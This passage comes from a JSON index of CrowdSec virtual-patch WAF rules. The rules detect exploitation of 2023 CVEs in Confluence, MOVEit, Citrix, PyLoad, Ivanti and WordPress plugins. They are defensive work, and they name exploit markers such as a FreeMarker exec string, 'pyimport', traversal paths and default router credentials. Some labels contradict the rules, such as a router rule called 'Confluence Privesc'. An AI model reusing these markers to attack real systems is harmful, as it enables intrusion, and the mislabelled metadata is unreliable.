{"0.1": {"digest": "e251805a453d65934e5794cbb96ce34179ce20981a123103d814afdcbb788d00"}, "0.2": {"digest": "6d2c89d06aefeacf14816f1cc755365056efcdba79265a0bb587033ca5790962"}, "0.3": {"digest": "00ad3b04df93d2ea077b69ecfcc1156ad0262005ab9915b740f6fb0c08fe86a1"}, "0.4": {"digest": "01f9badf366abe7fc3572b8814139521f114e15d716ee06541076dae4670a0fa"}, "0.5": {"digest": "b70ef73cc7e6c472e2a66ed981d434cc8678ab45d9409de1967613140f545140"}}}, "crowdsecurity/vpatch-CVE-2023-0297": {"content": "## autogenerated on 2025-04-15 14:50:06\nname: crowdsecurity/vpatch-CVE-2023-0297\ndescription: 'Detects pre-auth remote code execution in PyLoad via code injection in the \"jk\" parameter of /flash/addcrypted2.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: /flash/addcrypted2\n      - zones:\n          - BODY_ARGS\n        variables:\n          - jk\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: contains\n          value: pyimport\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'PyLoad - RCE'\n  classification:\n    - cve.CVE-2023-0297\n    - attack.T1190\n    - cwe.CWE-94\n", "description": "Detects pre-auth remote code execution in PyLoad via code injection in the \"jk\" parameter of /flash/addcrypted2.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-0297.yaml", "version": "0.1", "versions": {"0.1": {"digest": "e8a42e70849094087c9e939eac2ba4cd25445cdc31f1483fd40ef046ef216d24"}}}, "crowdsecurity/vpatch-CVE-2023-0600": {"content": "name: crowdsecurity/vpatch-CVE-2023-0600\ndescription: \"WP Visitor Statistics - SQL Injection (CVE-2023-0600)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - ARGS\n      variables:\n      - visitorId\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WP Visitor Statistics - SQL Injection\"\n  classification:\n   - cve.CVE-2023-0600\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "WP Visitor Statistics - SQL Injection (CVE-2023-0600)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-0600.yaml", "version": "0.1", "versions": {"0.1": {"digest": "042e6a9a38c8e735cf473e70a6524fe63a42a2f8e2d0682f4700e93596790b9a"}}}, "crowdsecurity/vpatch-CVE-2023-0900": {"content": "name: crowdsecurity/vpatch-CVE-2023-0900\ndescription: \"AP Pricing Tables Lite - SQL Injection (CVE-2023-0900)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /wp-admin/admin-ajax.php\n    - zones:\n      - BODY_ARGS\n      variables:\n      - action\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: backend_ajax\n    - zones:\n      - BODY_ARGS\n      variables:\n      - _action\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: copy_table\n    - zones:\n      - BODY_ARGS\n      variables:\n      - table_id\n      match:\n        type: libinjectionSQL\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"AP Pricing Tables Lite - SQL Injection\"\n  classification:\n   - cve.CVE-2023-0900\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "AP Pricing Tables Lite - SQL Injection (CVE-2023-0900)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-0900.yaml", "version": "0.1", "versions": {"0.1": {"digest": "0eda46d8fc66068ae1c21fe0eba7ea2aadfcc01fc50e2fc85cd3751808bdbb30"}}}, "crowdsecurity/vpatch-CVE-2023-1389": {"content": "name: crowdsecurity/vpatch-CVE-2023-1389\ndescription: \"TP-Link Archer AX21 - RCE (CVE-2023-1389)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /cgi-bin/luci/;stok=/locale\n    - zones:\n      - ARGS\n      variables:\n      - form\n      match:\n        type: equals\n        value: country\n    - zones:\n      - BODY_ARGS\n      - ARGS\n      variables:\n      - operation\n      match:\n        type: equals\n        value: write\n    - zones:\n      - BODY_ARGS\n      - ARGS\n      variables:\n      - country\n      match:\n        type: regex\n        value: \"[^a-zA-Z0-9_.-]+\"\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"TP-Link Archer AX21 - RCE\"\n  classification:\n   - cve.CVE-2023-1389\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-77\n", "description": "TP-Link Archer AX21 - RCE (CVE-2023-1389)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-1389.yaml", "version": "0.1", "versions": {"0.1": {"digest": "fedda002c3f2a7d4435a63833a834facdb2f73344477edb65c96af7ea2f6968f"}}}, "crowdsecurity/vpatch-CVE-2023-2009": {"content": "name: crowdsecurity/vpatch-CVE-2023-2009\ndescription: \"Pretty Url - XSS (CVE-2023-2009)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /wp-admin/admin.php\n    - zones:\n      - ARGS\n      variables:\n      - page\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: prettyurls\n    - zones:\n      - BODY_ARGS\n      variables:\n      - url\n      match:\n        type: libinjectionXSS\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Pretty Url - XSS\"\n  classification:\n   - cve.CVE-2023-2009\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "Pretty Url - XSS (CVE-2023-2009)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-2009.yaml", "version": "0.1", "versions": {"0.1": {"digest": "dd7ecf1962e15c56cbf6a74de336271ddd10cbd99c10d14d4b92df090f5fa018"}}}, "crowdsecurity/vpatch-CVE-2023-20198": {"content": "name: crowdsecurity/vpatch-CVE-2023-20198\ndescription: \"CISCO IOS XE Account Creation (CVE-2023-20198)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /%77ebui_wsma_https\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"CISCO IOS XE account creation\"\n  classification:\n   - cve.CVE-2023-20198\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-287", "description": "CISCO IOS XE Account Creation (CVE-2023-20198)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-20198.yaml", "version": "0.6", "versions": {"0.1": {"digest": "100fe7c75a8b557d6ad35bc8712b996d9366631dda64d8a72e245293773ef2ae"}, "0.2": {"digest": "4ed8476a931d3b45b210669ccab401d736bc765cc21ea02ed8fbddc21e6598ca"}, "0.3": {"digest": "eedd4555f876c459d0a17950f3b1311404b44d248b789221fddf73054e429bc0"}, "0.4": {"digest": "4d5339081ffa687619f13b3480984e056f64cab397154c187470ef1144a5fed3"}, "0.5": {"digest": "c4356c6967555f649c5ce02078d5f64c5a3905004519072d7c9c36ee638a66ba"}, "0.6": {"digest": "a14a7f74314729684f6c0bcaee613779d83b4dd58555f763cfb1c10f37349781"}}}, "crowdsecurity/vpatch-CVE-2023-22515": {"content": "name: crowdsecurity/vpatch-CVE-2023-22515\ndescription: \"Atlassian Confluence Privesc (CVE-2023-22515)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /setup/setupadministrator.action\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - HEADERS\n      variables:\n       - x-atlassian-token\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"no-check\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Atlassian Confluence Privesc\"\n  classification:\n   - cve.CVE-2023-22515\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-284", "description": "Atlassian Confluence Privesc (CVE-2023-22515)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-22515.yaml", "version": "0.4", "versions": {"0.1": {"digest": "dc6fc69ee52353cef3ea5563dbccd5b73dae0924e0bf13e38550768a23eeee8c"}, "0.2": {"digest": "bf313622a8c6b00bdaf421bb0766c1a0d077aaff8db50c32c4b1090dbbbf0fb9"}, "0.3": {"digest": "16d7f6ff1913304df2a270b3a27ba5d1165be8e3c7978489cfb9338875bb4d42"}, "0.4": {"digest": "8bf6511a6046718e06db86f0ffbaf0a8e636e62b3bc700fc8869919b70111698"}}}, "crowdsecurity/vpatch-CVE-2023-22527": {"content": "name: crowdsecurity/vpatch-CVE-2023-22527\ndescription: \"RCE using SSTI in Confluence (CVE-2023-22527)\"\nrules:\n  - and:\n      - zones:\n          - METHOD\n        match:\n          type: equals\n          value: POST\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: equals\n          value: /template/aui/text-inline.vm\n      - zones:\n          - RAW_BODY\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: \"freemarker.template.utility.execute()).exec\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Confluence RCE\"\n  references:\n    - https://blog.projectdiscovery.io/atlassian-confluence-ssti-remote-code-execution/\n    - https://confluence.atlassian.com/security/cve-2023-22527-rce-remote-code-execution-vulnerability-in-confluence-data-center-and-confluence-server-1333990257.html\n  classification:\n    - cve.CVE-2023-22527\n    - attack.T1595\n    - attack.T1190", "description": "RCE using SSTI in Confluence (CVE-2023-22527)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-22527.yaml", "version": "0.2", "versions": {"0.1": {"digest": "322eefa82144adaa963690cce3c672312e5ecb805334a972d8c4c40953054df6"}, "0.2": {"digest": "b6d23c5a79107b37ffdcb20def2b749821800a036fd99ad58d3faff2d830eb59"}}}, "crowdsecurity/vpatch-CVE-2023-23063": {"content": "## autogenerated on 2025-10-01 14:01:13\nname: crowdsecurity/vpatch-CVE-2023-23063\ndescription: 'Detects local file disclosure in Cellinx NVT Web Server via GetFileContent.cgi PATH parameter.'\nrules:\n  - and:\n      - zones:\n          - URI\n        transform:\n          - lowercase\n        match:\n          type: contains\n          value: /cgi-bin/getfilecontent.cgi\n      - zones:\n          - ARGS\n        variables:\n          - path\n        transform:\n          - lowercase\n          - urldecode\n        match:\n          type: regex\n          value: '^(/|\\.\\./)'\n\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: 'http:exploit'\n  label: 'Cellinx NVT Web Server - LFI'\n  classification:\n    - cve.CVE-2023-23063\n    - attack.T1005\n    - cwe.CWE-22\n", "description": "Detects local file disclosure in Cellinx NVT Web Server via GetFileContent.cgi PATH parameter.", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-23063.yaml", "version": "0.1", "versions": {"0.1": {"digest": "7301d058b97192dab320f383c112d8b1ca912113bf8ea4ff036af25877053344"}}}, "crowdsecurity/vpatch-CVE-2023-23488": {"content": "name: crowdsecurity/vpatch-CVE-2023-23488\ndescription: \"Wordpress Paid Memberships Pro Blind SQLi (CVE-2023-23488)\"\nrules:\n  - and:\n    - zones:\n        - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n        - ARGS\n      variables:\n        - rest_route\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /pmpro/v1/order\n    - zones:\n        - ARGS\n      transform:\n        - lowercase\n      variables:\n        - code\n      match:\n        type: libinjectionSQL\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Wordpress Paid Memberships Pro Blind SQLi\"\n  references:\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-23488\n  classification:\n   - cve.CVE-2023-23488\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "Wordpress Paid Memberships Pro Blind SQLi (CVE-2023-23488)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-23488.yaml", "version": "0.2", "versions": {"0.1": {"digest": "67d7dfcc20e2ac9e14458c6a1c2caff6740c4cbe786add2ae80013c01b0dd2c1"}, "0.2": {"digest": "ea957b223f4c36ef79772a453ab34f47c96cad018cd43cd15f86dd4632ab381a"}}}, "crowdsecurity/vpatch-CVE-2023-23489": {"content": "name: crowdsecurity/vpatch-CVE-2023-23489\ndescription: \"WordPress Easy Digital Downloads plugin SQL injection (CVE-2023-23489)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: /wp-admin/admin-ajax.php\n    - zones:\n      - ARGS\n      variables:\n       - action\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"edd_download_search\"\n    - zones:\n      - ARGS\n      variables:\n       - s\n      match:\n        type: libinjectionSQL\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WordPress Easy Digital Downloads plugin SQL injection\"\n  classification:\n   - cve.CVE-2023-23489\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "WordPress Easy Digital Downloads plugin SQL injection (CVE-2023-23489)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-23489.yaml", "version": "0.1", "versions": {"0.1": {"digest": "69a9fdc2e30454842c6a90ecfd55ce85095f4a1a0833ad5e6cb3437e733b55e7"}}}, "crowdsecurity/vpatch-CVE-2023-23752": {"content": "name: crowdsecurity/vpatch-CVE-2023-23752\ndescription: \"Joomla! Webservice - Password Disclosure (CVE-2023-23752)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: regex\n        value: (/config/application|/users)$\n    - zones:\n      - ARGS\n      variables:\n      - public\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"true\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Joomla! Webservice - Password Disclosure\"\n  classification:\n   - cve.CVE-2023-23752\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-284\n   - cwe.CWE-266\n\n\n", "description": "Joomla! Webservice - Password Disclosure (CVE-2023-23752)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-23752.yaml", "version": "0.1", "versions": {"0.1": {"digest": "fa79ea72e00dfcc1e067e8906823f2df7897b8925b86417b1fc1fdab5f26ac6a"}}}, "crowdsecurity/vpatch-CVE-2023-24489": {"content": "name: crowdsecurity/vpatch-CVE-2023-24489\ndescription: \"Citrix ShareFile RCE (CVE-2023-24489)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /documentum/upload.aspx\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - ARGS\n      variables:\n       - uploadid\n      match:\n        type: contains\n        value: \"..\"\n    - zones:\n      - RAW_BODY\n#it seems 'Page_Load' is the handler that can be abused, maybe some others can?\n      match:\n        type: contains\n        value: \"Page_Load\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Citrix ShareFile RCE\"\n  classification:\n   - cve.CVE-2023-24489\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-284", "description": "Citrix ShareFile RCE (CVE-2023-24489)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-24489.yaml", "version": "0.2", "versions": {"0.1": {"digest": "c7ec7c49ee24ba7ba855e3ae256ec2d128b51c7771d676dc150aa3cc060ca785"}, "0.2": {"digest": "16e398688d669dbf5181718b18338df2baf906212e563749ce5d0041a56543dd"}}}, "crowdsecurity/vpatch-CVE-2023-28121": {"content": "name: crowdsecurity/vpatch-CVE-2023-28121\ndescription: \"WooCommerce auth bypass (CVE-2023-28121)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - HEADERS_NAMES\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: x-wcpay-platform-checkout-user\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WooCommerce auth bypass\"\n  classification:\n   - cve.CVE-2023-28121\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-287", "description": "WooCommerce auth bypass (CVE-2023-28121)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-28121.yaml", "version": "0.1", "versions": {"0.1": {"digest": "6a72dcabc9d7df47d1b5e7b7fa17ca4548e4b6c3cd9cbfcc6d1fea541aaab092"}}}, "crowdsecurity/vpatch-CVE-2023-33617": {"content": "name: crowdsecurity/vpatch-CVE-2023-33617\ndescription: \"Atlassian Confluence Privesc (CVE-2023-33617)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: post\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /boaform/admin/formlogin\n    - zones:\n      - BODY_ARGS\n      variables:\n       - username\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"admin\"\n    - zones:\n      - BODY_ARGS\n      variables:\n       - psd\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: \"parks\"\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /boaform/admin/formping\n    - zones:\n      - BODY_ARGS\n      variables:\n      - target_addr\n      transform:\n      - lowercase\n      match:\n        type: regex\n        value: \"[^a-f0-9:.]+\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Atlassian Confluence Privesc\"\n  classification:\n   - cve.CVE-2023-33617\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-78", "description": "Atlassian Confluence Privesc (CVE-2023-33617)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-33617.yaml", "version": "0.4", "versions": {"0.1": {"digest": "27d605f7f1aa991127741c047ca8c4af1e0113feafb2073fd9aa04793c311d6e"}, "0.2": {"digest": "15df9e2f71f34f037f96f7a9b61e6cbab993f3de3708ee92cda32bec84412391"}, "0.3": {"digest": "399c24c2222b455a5e9030ad0a31b58261e62724051655f7b98be4cdc8cc96d3"}, "0.4": {"digest": "2c5a0d6ffd19c4d14b691c51028dab5a3a32280bb6ec6943ef60e0e105ee8647"}}}, "crowdsecurity/vpatch-CVE-2023-34362": {"content": "\nname: crowdsecurity/vpatch-CVE-2023-34362\ndescription: \"MOVEit Transfer RCE (CVE-2023-34362)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: equals\n        value: /moveitisapi/moveitisapi.dll\n    - zones:\n      - ARGS\n      variables:\n      - action\n      match:\n        type: equals\n        value: m2\n      transform:\n      - lowercase\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - HEADERS_NAMES\n      transform:\n        - lowercase\n      match:\n        type: equals\n        value: 'x-silock-transaction'\n    - zones:\n      - HEADERS_NAMES\n      transform:\n       - lowercase\n      match:\n        type: regex\n        value: '.+x-silock-transaction'\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"MOVEit Transfer RCE\"\n  classification:\n   - cve.CVE-2023-34362\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-89", "description": "MOVEit Transfer RCE (CVE-2023-34362)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-34362.yaml", "version": "0.6", "versions": {"0.1": {"digest": "b032c0e88f383ffb1228287b53f61443eb9c91db1cd730c4e10dd42bf44d86d9"}, "0.2": {"digest": "be808170ee4c42540423351f6d188b8cd22899810357f188d404a61f07b64dc7"}, "0.3": {"digest": "f579f526676ecaded1b1048503b9fd738144a67b2f7f0b14d6d770c35aa98cf6"}, "0.4": {"digest": "1af2e304188e802a2aedc45557e41c2e6debac3d8246ec1e44d57f7d664c9677"}, "0.5": {"digest": "bc1e444bcbe52474d0a3d9dd7293681d0a6ca0a034cded87e095460403985b9d"}, "0.6": {"digest": "db7744c5124e1531f5c3e141df01fa6dedd5c88cccefb32e5e38206820807c27"}}}, "crowdsecurity/vpatch-CVE-2023-35078": {"content": "name: crowdsecurity/vpatch-CVE-2023-35078\ndescription: \"MobileIron Core Remote Unauthenticated API Access (CVE-2023-35078)\"\nrules:\n       - zones:\n           - URI\n         transform:\n           - lowercase\n         match:\n           type: contains\n           value: /mifs/aad/api/v2/\nlabels:\n   type: exploit\n   service: http\n   confidence: 3\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"MobileIron Core API\"\n   references:\n    - https://forums.ivanti.com/s/article/CVE-2023-35078-Remote-unauthenticated-API-access-vulnerability?language=en_US\n    - https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-35078\n   classification:\n     - cve.CVE-2023-35078\n     - attack.T1595\n     - attack.T1190 ", "description": "MobileIron Core Remote Unauthenticated API Access (CVE-2023-35078)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-35078.yaml", "version": "0.1", "versions": {"0.1": {"digest": "24955c9a4642704372c1a26193d4a599165cd486b1f5f3c60bd72991d1ecd18f"}}}, "crowdsecurity/vpatch-CVE-2023-35082": {"content": "name: crowdsecurity/vpatch-CVE-2023-35082\ndescription: \"MobileIron Core Remote Unauthenticated API Access (CVE-2023-35082)\"\nrules:\n       - zones:\n           - URI\n         transform:\n           - lowercase\n         match:\n           type: contains\n           value: /mifs/asfv3/api/v2/\nlabels:\n   type: exploit\n   service: http\n   confidence: 3\n   spoofable: 0\n   behavior: \"http:exploit\"\n   label: \"MobileIron Core API\"\n   references:\n    - https://www.rapid7.com/blog/post/2023/08/02/cve-2023-35082-mobileiron-core-unauthenticated-api-access-vulnerability/\n    - https://nvd.nist.gov/vuln/detail/CVE-2023-35082\n    - https://forums.ivanti.com/s/article/CVE-2023-35082-Remote-Unauthenticated-API-Access-Vulnerability-in-MobileIron-Core-11-2-and-older?language=en_US\n   classification:\n     - cve.CVE-2023-35082\n     - attack.T1595\n     - attack.T1190 ", "description": "MobileIron Core Remote Unauthenticated API Access (CVE-2023-35082)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-35082.yaml", "version": "0.2", "versions": {"0.1": {"digest": "7c66626c83d7f91407257df0897a9adb5958043bbb4d70dece61e0245db2dcc8"}, "0.2": {"digest": "678db5fe74dc3ee8191cde2e79346935efb2363b7ab93622cdeb1e2fca45f943"}}}, "crowdsecurity/vpatch-CVE-2023-3519": {"content": "name: crowdsecurity/vpatch-CVE-2023-3519\ndescription: \"Citrix RCE (CVE-2023-3519)\"\nrules:\n  - and:\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: GET\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /gwtest/formssso\n    - zones:\n      - ARGS\n      variables:\n       - target\n      transform:\n      - length\n      match:\n        type: gte\n        value: 100\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Citrix RCE\"\n  classification:\n   - cve.CVE-2023-3519\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-94", "description": "Citrix RCE (CVE-2023-3519)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-3519.yaml", "version": "0.3", "versions": {"0.1": {"digest": "459cd434b8da480eaa0bfbbefc9806ca8c445a64757cbd339f1f7b6b32082f6f"}, "0.2": {"digest": "57441c54adbcb8cd88ba205b1f1358dfc10c1779662efe7e9854469b986c5f54"}, "0.3": {"digest": "8cc7bb6fd0d71871b7fb1f891182d3a12273dd507c1d59c7539dc620de6c70c4"}}}, "crowdsecurity/vpatch-CVE-2023-38205": {"content": "name: crowdsecurity/vpatch-CVE-2023-38205\ndescription: \"Adobe ColdFusion Access Control Bypass (CVE-2023-38205)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: ..cfide/wizards/common/\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Adobe ColdFusion Access Control Bypass\"\n  classification:\n   - cve.CVE-2023-38205\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-284", "description": "Adobe ColdFusion Access Control Bypass (CVE-2023-38205)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-38205.yaml", "version": "0.3", "versions": {"0.1": {"digest": "d2c3666c0a337304d92b737ca02ad1aed164e31439eb6596a848688f0c27b178"}, "0.2": {"digest": "5403b1146ab6a652b31c572f07863ce284d63a6c6a26d254a3c064de0479cb26"}, "0.3": {"digest": "43a1a41cff1a160eeeb468b52a5fcc2889ee917a4db0396e42c8d6219fdb60c4"}}}, "crowdsecurity/vpatch-CVE-2023-40044": {"content": "name: crowdsecurity/vpatch-CVE-2023-40044\ndescription: \"WS_FTP .NET deserialize RCE (CVE-2023-40044)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /aht/\n    - zones:\n      - METHOD\n      match:\n        type: equals\n        value: POST\n    - zones:\n      - BODY_ARGS\n      transform:\n      - b64decode\n      - lowercase\n      match:\n        type: contains\n        value: \"<s:string>cmd</s:string>\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"WS_FTP .NET deserialize RCE\"\n  classification:\n   - cve.CVE-2023-40044\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-502\n\n\n", "description": "WS_FTP .NET deserialize RCE (CVE-2023-40044)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-40044.yaml", "version": "0.3", "versions": {"0.1": {"digest": "2e8db7d8cb223e1cb1a57c4621b1720d88174c3398183948c8901645f78ee338"}, "0.2": {"digest": "e49809530908e16a9628fece23d934be09d9756fc64f795d7311e70565a2f32e"}, "0.3": {"digest": "a32dec2d2ccf399ab0b9bc86dfeb48b7b11037ca617ea8e4ffbce02ed467247b"}}}, "crowdsecurity/vpatch-CVE-2023-42793": {"content": "name: crowdsecurity/vpatch-CVE-2023-42793\ndescription: \"JetBrains Teamcity Auth Bypass (CVE-2023-42793)\"\nrules:\n  - zones:\n    - URI\n    transform:\n    - lowercase\n    match:\n      type: endsWith\n      value: /rpc2\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"JetBrains Teamcity Auth Bypass\"\n  classification:\n   - cve.CVE-2023-42793\n   - attack.T1595\n   - attack.T1190\n   - cwe.CWE-288\n", "description": "JetBrains Teamcity Auth Bypass (CVE-2023-42793)", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-42793.yaml", "version": "0.3", "versions": {"0.1": {"digest": "86fb6a193e9799612bf00b67894f7aabe4482f024a012f305b2cfa910384aa73"}, "0.2": {"digest": "7e7078b0858ea9d8d32c2f9fa9f6879b2322c7b4da1558f9a60708b129dfc1ef"}, "0.3": {"digest": "c5440ec9305b7dcd1afd0c3d414b5558eb4ab8e64b41acf7ff2427330eabe91a"}}}, "crowdsecurity/vpatch-CVE-2023-4634": {"content": "name: crowdsecurity/vpatch-CVE-2023-4634\ndescription: \"Media Library Assistant - RCE 2023 4634\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: endsWith\n        value: /wp-content/plugins/media-library-assistant/includes/mla-stream-image.php\n    - zones:\n      - ARGS\n      variables:\n      - mla_stream_file\n      match:\n        type: regex\n        value: \".*://.*\"\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  label: \"Media Library Assistant RCE\"\n  classification:\n   - cve.CVE-2023-4634\n   - attack.T1190\n   - cwe.CWE-73\n", "description": "Media Library Assistant - RCE 2023 4634", "path": "appsec-rules/crowdsecurity/vpatch-CVE-2023-4634.yaml", "version": "0.2", "versions": {"0.1": {"digest": "11b0f4eefe044ff7a50344ab55717717a720df83a48cd87c48016fb9f700c94d"}, "0.2": {"digest": "f1c2c3a8dabe2c020132a4b45ac1fb05a110b1b50779b5e01c47fcd867094338"}}}, "crowdsecurity/vpatch-CVE-2023-46805": {"content": "name: crowdsecurity/vpatch-CVE-2023-46805\ndescription: \"Ivanti Connect Auth Bypass (CVE-2023-46805)\"\nrules:\n  - and:\n    - zones:\n      - URI\n      transform:\n      - lowercase\n      match:\n        type: contains\n        value: /api/v1/totp/user-backup-code/../\nlabels:\n  type: exploit\n  service: http\n  confidence: 3\n  spoofable: 0\n  behavior: \"http:exploit\"\n  references:\n    - \"https://attackerkb.com/topics/AdUh6by52K/cve-2023-46805/rapid7-analysis\"\n  label: \"Ivanti Connect Auth Bypass\"\n  classification:\n   - cve.CVE-2023-46805\n   - 